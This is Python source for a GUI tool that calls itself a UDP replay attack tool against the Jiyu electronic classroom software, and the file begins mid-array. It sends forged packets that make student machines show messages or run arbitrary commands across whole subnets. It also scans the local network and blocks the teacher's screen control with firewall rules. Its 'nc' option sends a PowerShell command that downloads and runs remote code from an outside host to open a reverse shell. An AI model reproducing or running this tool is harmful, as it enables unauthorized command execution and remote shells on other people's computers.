0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]]
basicCMD = {
    '-msg': store[0],
    '-c': store[1],
    '-r': store[2],
    '-s': store[3],
}
# ----------------------------


def format_b4_send(content):
    """将字符串转换为十六进制数组（原始代码格式化方法）"""
    arr = []
    for ch in content:
        tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
        if int(tmp, 16) > 0xff:
            tmp = tmp[2:]
            high = int(tmp[0:2], 16)
            low = int(tmp[2:4], 16)
            arr.append(low)
            arr.append(high)
        else:
            high = 0
            low = int(tmp[2:4], 16)
            arr.append(low)
            arr.append(high)
    return arr


def get_ip(ip):
    """解析 -ip 参数，支持单个IP、IP范围（如 "192.168.80.10-56"）以及 C 段（如 "192.168.80.23/24"）"""
    target_host = []
    if '.' not in ip:
        return target_host
    if '-' in ip:
        ip_arr = ip.split('-')
        ip_arrs = ip_arr[0].split('.')
        if int(ip_arr[1]) > 254:
            ip_arr[1] = '254'
        for i in range(int(ip_arrs[3]), int(ip_arr[1]) + 1):
            ip_arrs[3] = str(i)
            target_host.append('.'.join(ip_arrs))
    elif '/' not in ip:
        target_host.append(ip)
    elif '/24' in ip:
        ip_arr = ip.split('/')
        ip_arrs = ip_arr[0].split('.')
        for i in range(1, 255):
            ip_arrs[3] = str(i)
            target_host.append('.'.join(ip_arrs))
    return target_host


def pkg_sendlist(cmdtype, content):
    """将文本内容写入对应模板中：-msg 从下标 56，-c 从下标 578"""
    arrs = format_b4_send(content)
    if cmdtype == '-msg':
        index = 56
        result = basicCMD['-msg'][:]
        for elem in arrs:
            if index < len(result):
                result[index] = elem
                index += 1
    elif cmdtype == '-c':
        index = 578
        result = basicCMD['-c'][:]
        for elem in arrs:
            if index < len(result):
                result[index] = elem
                index += 1
    else:
        result = []
    return result


def pkg_send_extra_option(option):
    """根据额外选项构造数据包，固定填充到 156 字节"""
    mapping = {
        "r": "RBT_",
        "s": "SHT_",
        "g": "GET_",
        "nc": "NSHL",
        "break": "BRK_",
        "continue": "CONT"
    }
    head = mapping.get(option, "EXTR")
    payload = [ord(ch) for ch in head] + [ord(ch) for ch in option]
    payload += [0x00] * (156 - len(payload))
    return payload


# 自动检测本机网卡的 /24 网段
def get_local_networks():
    networks = []
    try:
        hostname = socket.gethostname()
        ips = socket.gethostbyname_ex(hostname)[2]
        for ip in ips:
            if ip.startswith("192.168.") or ip.startswith("10.") or (
                    ip.startswith("172.") and 16 <= int(ip.split('.')[1]) <= 31):
                net = ".".join(ip.split('.')[:3]) + ".0/24"
                if net not in networks:
                    networks.append(net)
    except Exception as e:
        pass
    return networks


# ----------------------------
# 以下为独立功能
def action_get_ip_port(log_callback):
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        log_callback("[*] Your ip address is: " + ip)
        tasklist = popen('tasklist|find "Student"').read()
        pattern = re.compile(r"[e]\s*\d{1,5}\s*[C]")
        m = pattern.search(tasklist)
        if not m:
            log_callback("[-] 未能获取到学生端进程信息")
            return
        pid = m.group()[1:-1].strip()
        netstat = popen("netstat -ano |find \"{}\"".format(pid)).read()
        pattern = re.compile(r"%s:\d{1,5}\s*\*{1}" % ip)
        netstat_pat = pattern.findall(netstat)
        ports = [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
        log_callback("[+] Your student client possible ports are: " + ', '.join(ports))
    except Exception as e:
        log_callback("[-] 获取IP/端口错误: " + str(e))


def action_break_screen(log_callback):
    try:
        popen("sc config MpsSvc start= auto")
        popen("net start MpsSvc")
        popen("netsh advfirewall set allprofiles state on")
        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')
        sleep(1)
        log_callback("[+] 脱离屏幕控制已执行。")
    except Exception as e:
        log_callback("[-] 执行 break 错误: " + str(e))


def action_continue_screen(log_callback):
    try:
        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')
        log_callback("[+] 恢复屏幕控制已执行。")
    except Exception as e:
        log_callback("[-] 执行 continue 错误: " + str(e))


def action_netcat(listening_port, target_ip, target_port, log_callback):
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        cmd = ("powershell IEX (New-Object System.Net.Webclient).DownloadString("
               "'https://xss.pt/hYvg');powercat -c {} -p {} -e cmd").format(local_ip, listening_port)
        data = pkg_sendlist('-c', cmd)
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = pack("%dB" % len(data), *data)
        client.sendto(payload, (target_ip, target_port))
        client.close()
        log_callback("[+] 反弹 shell 命令已发送，监听端口: " + str(listening_port))
        log_callback("[*] 请在 PowerShell 中执行监听命令以接收反弹 shell。")
    except Exception as e:
        log_callback("[-] 反弹 shell 错误: " + str(e))


def action_scan_network(ip_text, log_callback, progress_callback):
    ips = get_ip(ip_text)
    if not ips:
        log_callback("[-] IP格式错误，无法解析网段")
        return
    log_callback("[*] 开始扫描网段，请稍候...")
    total = len(ips)
    counter = [0]
    active_ips = []
    semaphore = threading.Semaphore(35)  # 限制并发线程数量

    def ping_ip(ip):
        nonlocal counter
        with semaphore:
            try:
                result = subprocess.run(["ping", "-n", "1", "-w", "100", ip],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                with threading.Lock():
                    counter[0] += 1
                    progress_callback(counter[0])
                if result.returncode == 0:
                    active_ips.append(ip)
                    log_callback(f"[+] {ip} 在线")
                else:
                    log_callback(f"[-] {ip} 无响应")
            except Exception as e:
                log_callback(f"[-] {ip} 扫描错误: {e}")

    threads = []
    for ip in ips:
        t = threading.Thread(target=ping_ip, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    if active_ips:
        log_callback("[*] 扫描完成。在线主机: " + ', '.join(active_ips))
    else:
        log_callback("[-] 扫描完成。无在线主机。")


# ----------------------------
# GUI 部分
class InfoDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("使用教程")
        self.resize(600, 400)
        layout = QVBoxLayout(self)
        info_text = (
            "【关于】\n"
            "本程序由 ht0Ruial 的 Jiyu_udp_attack 改造而成，作者 NULL11034。\n\n"
            "【使用说明】\n\n"
            "1. 获取内网IP及学生端端口：选 'g'\n"
            "2. 脱离屏幕控制（需管理员）：选 'break'\n"
            "3. 恢复屏幕控制：选 'continue'\n"
            "4. 发送消息：命令类型 -msg，输入消息（如 \"hello,baby!\"），-ip 支持单个IP、范围或 /24\n"
            "5. 执行命令：命令类型 -c，输入命令（如 \"calc.exe\" 或 \"cmd.exe /c ipconfig\"）\n"
            "6. 批量命令执行：在文本框中每行一条命令，并勾选批量模式\n"
            "7. 反弹 shell：选 'nc'（仅单个IP），工具随机生成监听端口，需提前设置 Powercat 监听\n"
            "8. 内网扫描：-ip 输入 /24 格式，点击“扫描内网”\n"
            "9. 多网卡检测：点击“检测本机网卡”自动填充 -ip\n"
            "10. 循环发送：-l 设置循环次数，-t 设置发送间隔\n\n"
            "注意：请确保目标环境允许UDP数据包重放，并具备相应权限。"
        )
        scroll = QScrollArea()
        content_label = QLabel(info_text)
        content_label.setWordWrap(True)
        scroll.setWidget(content_label)
        scroll.setWidgetResizable(True)
        layout.addWidget(scroll)
        buttonBox = QDialogButtonBox(QDialogButtonBox.StandardButton.Close)
        buttonBox.rejected.connect(self.reject)
        layout.addWidget(buttonBox)


class MainWindow(QMainWindow):
    progress_signal = pyqtSignal(int)
    set_max_signal = pyqtSignal(int)

    def __init__(self):
        super().__init__()
        self.setWindowTitle("极域电子教室 UDP 重放攻击工具")
        self.resize(750, 700)
        self.initUI()
        self.progress_signal.connect(self.progressBar.setValue)
        self.set_max_signal.connect(self.progressBar.setMaximum)

    def initUI(self):
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout()

        # -ip 输入及多网卡检测区域
        ip_layout = QHBoxLayout()
        ip_label = QLabel("-ip (例如: 192.168.80.12 或 192.168.80.10-56 或 192.168.80.23/24):")
        self.ip_edit = QLineEdit()
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.ip_edit)
        main_layout.addLayout(ip_layout)

        local_net_layout = QHBoxLayout()
        local_net_label = QLabel("本机网卡:")
        self.local_net_combo = QComboBox()
        detect_button = QPushButton("检测本机网卡")
        detect_button.setFixedHeight(40)
        detect_button.setStyleSheet("font-size: 16px;")
        detect_button.clicked.connect(self.detectLocalNetworks)
        local_net_layout.addWidget(local_net_label)
        local_net_layout.addWidget(self.local_net_combo)
        local_net_layout.addWidget(detect_button)
        main_layout.addLayout(local_net_layout)

        # -p 端口输入
        port_layout = QHBoxLayout()
        port_label = QLabel("-p (端口):")
        self.port_edit = QLineEdit("4705")
        port_layout.addWidget(port_label)
        port_layout.addWidget(self.port_edit)
        main_layout.addLayout(port_layout)

        # 命令类型选择
        cmd_layout = QHBoxLayout()
        cmd_label = QLabel("命令类型:")
        self.cmd_combo = QComboBox()
        self.cmd_combo.addItems(["-msg", "-c"])
        cmd_layout.addWidget(cmd_label)
        cmd_layout.addWidget(self.cmd_combo)
        main_layout.addLayout(cmd_layout)

        # 消息/命令内容输入（改为 QTextEdit 支持多行）
        content_layout = QVBoxLayout()
        content_label = QLabel("消息/命令内容:")
        self.content_edit = QTextEdit()
        content_layout.addWidget(content_label)
        content_layout.addWidget(self.content_edit)
        main_layout.addLayout(content_layout)

        # 批量命令执行复选框（仅对 -c 有效）
        self.batch_checkbox = QCheckBox("批量命令执行（每行一条命令）")
        main_layout.addWidget(self.batch_checkbox)

        # 额外选项 (-e)
        extra_layout = QHBoxLayout()
        extra_label = QLabel("额外选项 (-e):")
        self.extra_combo = QComboBox()
        self.extra_combo.addItems(["无", "r", "s", "g", "nc", "break", "continue"])
        extra_layout.addWidget(extra_label)
        extra_layout.addWidget(self.extra_combo)
        main_layout.addLayout(extra_layout)

        # 循环次数与发送间隔
        loop_layout = QHBoxLayout()
        loop_label = QLabel("-l (循环次数):")
        self.loop_edit = QLineEdit("1")
        interval_label = QLabel("-t (间隔秒):")
        self.interval_edit = QLineEdit("22")
        loop_layout.addWidget(loop_label)
        loop_layout.addWidget(self.loop_edit)
        loop_layout.addWidget(interval_label)
        loop_layout.addWidget(self.interval_edit)
        main_layout.addLayout(loop_layout)

        # 进度条
        self.progressBar = QProgressBar()
        self.progressBar.setValue(0)
        main_layout.addWidget(self.progressBar)

        # 下方增加“使用教程(以及关于)”和“扫描内网”按钮
        buttons_layout = QHBoxLayout()
        info_button = QPushButton("使用教程(以及关于)")
        info_button.setFixedHeight(40)
        info_button.setStyleSheet("font-size: 16px;")
        info_button.clicked.connect(self.showInfo)
        scan_button = QPushButton("扫描内网")
        scan_button.setFixedHeight(40)
        scan_button.setStyleSheet("font-size: 16px;")
        scan_button.clicked.connect(self.scanNetwork)
        buttons_layout.addWidget(info_button)
        buttons_layout.addWidget(scan_button)
        main_layout.addLayout(buttons_layout)

        # 发送/执行按钮
        self.send_button = QPushButton("开始执行")
        self.send_button.setFixedHeight(40)
        self.send_button.setStyleSheet("font-size: 16px;")
        self.send_button.clicked.connect(self.startAction)
        main_layout.addWidget(self.send_button)

        # 日志显示区域
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        main_layout.addWidget(self.log_output)

        central.setLayout(main_layout)

    def log(self, msg):
        self.log_output.append(msg)

    def showInfo(self):
        dlg = InfoDialog(self)
        dlg.exec()

    def detectLocalNetworks(self):
        nets = get_local_networks()
        if nets:
            self.local_net_combo.clear()
            self.local_net_combo.addItems(nets)
            self.local_net_combo.setCurrentIndex(0)
            self.ip_edit.setText(nets[0])
            self.log("[*] 检测到本机网卡网段: " + ", ".join(nets))
        else:
            self.log("[-] 未检测到本机私有IP网段。")

    def scanNetwork(self):
        ip_text = self.ip_edit.text().strip()
        if not ip_text:
            self.log("[-] 请先输入 -ip 后再进行内网扫描")
            return
        ips = get_ip(ip_text)
        if not ips:
            self.log("[-] 无法解析网段")
            return
        self.set_max_signal.emit(len(ips))
        self.progress_signal.emit(0)
        threading.Thread(target=action_scan_network, args=(ip_text, self.log, self.progress_signal.emit)).start()

    def startAction(self):
        ip_text = self.ip_edit.text().strip()
        if not ip_text:
            self.log("[-] 请输入目标IP地址")
            return
        try:
            port = int(self.port_edit.text().strip())
        except ValueError:
            self.log("[-] 端口必须为数字")
            return
        try:
            loop_count = int(self.loop_edit.text().strip())
            interval = float(self.interval_edit.text().strip())
        except ValueError:
            self.log("[-] 循环次数和间隔必须为数字")
            return

        extra_option = self.extra_combo.currentText().strip()
        if extra_option != "无":
            if extra_option == "g":
                threading.Thread(target=action_get_ip_port, args=(self.log,)).start()
                return
            elif extra_option == "break":
                threading.Thread(target=action_break_screen, args=(self.log,)).start()
                return
            elif extra_option == "continue":
                threading.Thread(target=action_continue_screen, args=(self.log,)).start()
                return
            elif extra_option == "nc":
                targets = get_ip(ip_text)
                if len(targets) != 1:
                    self.log("[-] 反弹 shell (-nc)只支持单个IP")
                    return
                rand_port = random.randint(1, 65535)
                threading.Thread(target=action_netcat, args=(rand_port, targets[0], port, self.log)).start()
                return
            else:
                data_list = basicCMD.get('-r') if extra_option == "r" else basicCMD.get('-s')
                if data_list is None:
                    self.log("[-] 未找到对应模板")
                    return
                data = bytes(data_list)
                targets = get_ip(ip_text)
                self.log("[*] 开始发送额外选项数据包...")
                self.send_data(targets, port, data, loop_count, interval)
                return

        # 如果额外选项为“无”
        cmd_type = self.cmd_combo.currentText().strip()
        content = self.content_edit.toPlainText().strip()
        if not content:
            self.log("[-] 请输入消息或命令内容")
            return
        # 如果批量执行被选中，则按行拆分命令发送（仅适用于命令执行）
        if self.batch_checkbox.isChecked():
            commands = [line.strip() for line in content.splitlines() if line.strip()]
            if not commands:
                self.log("[-] 批量命令内容为空")
                return
            targets = get_ip(ip_text)
            self.log("[*] 开始批量执行命令...")
            for command in commands:
                data_list = pkg_sendlist(cmd_type, command)
                data = bytes(data_list)
                self.send_data(targets, port, data, loop_count, interval)
                sleep(interval)
        else:
            data_list = pkg_sendlist(cmd_type, content)
            data = bytes(data_list)
            targets = get_ip(ip_text)
            self.log("[*] 开始发送数据包...")
            self.send_data(targets, port, data, loop_count, interval)

    def send_data(self, targets, port, data, loop_count, interval):
        def send_task(ip):
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for i in range(loop_count):
                try:
                    payload = pack("%dB" % len(data), *data)
                    client.sendto(payload, (ip, port))
                    self.log(f"[+] 发送到 {ip}:{port} 第 {i + 1} 次")
                except Exception as ex:
                    self.log(f"[-] {ip} 发送错误：{ex}")
                if i != loop_count - 1:
                    sleep(interval)
            client.close()

        threads = []
        for ip in targets:
            t = threading.Thread(target=send_task, args=(ip,))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        self.log("[*] 所有数据包发送完成。")


if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())